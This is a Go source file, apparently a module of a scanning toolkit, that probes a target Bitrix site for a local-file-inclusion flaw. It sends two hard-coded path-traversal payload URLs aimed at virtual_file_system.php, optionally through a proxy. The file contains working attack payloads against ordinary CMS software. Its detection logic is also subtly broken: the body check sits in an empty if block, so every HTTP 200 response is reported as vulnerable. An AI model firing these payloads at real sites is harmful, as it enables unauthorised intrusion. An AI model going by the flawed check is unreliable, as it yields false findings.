package lfi

import (
	"fmt"
	"github.com/origin-tech/quick-tricks/utils/netclient"
	"io"
	"strings"
)

const (
	endpoint1 = `/.htaccess/пистолетики/../../""""""""""""""""""""""""""""""/../bitrix/""""""""""""""""""""""""""""""/../virtual_file_system.php/""""""""""""""""""""""""""""""/../x/..`
	endpoint2 = "/.htaccess/пистолетики/../../../\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"/../bitrix/\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"/../virtual_file_system.php/\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"/../x/.."
)

func Detect(target, proxy string) ([]string, error) {
	var pages []string
	endpoints := []string{endpoint1, endpoint2}

	client, err := netclient.NewHTTPClient(proxy)
	if err != nil {
		err = fmt.Errorf("Unable to parse proxy string: %s", err.Error())
		return nil, err
	}

	for _, v := range endpoints {
		url := target + v
		resp, err := client.Get(url)
		if err != nil {
			return nil, err
		} else {
			if resp.StatusCode == 200 {
				body, _ := io.ReadAll(resp.Body)
				if len(body) != 0 {
					if !strings.Contains(string(body), "Filename is out of range.") {
					}
				}
				pages = append(pages, url)
			}
		}
	}
	return pages, nil
}
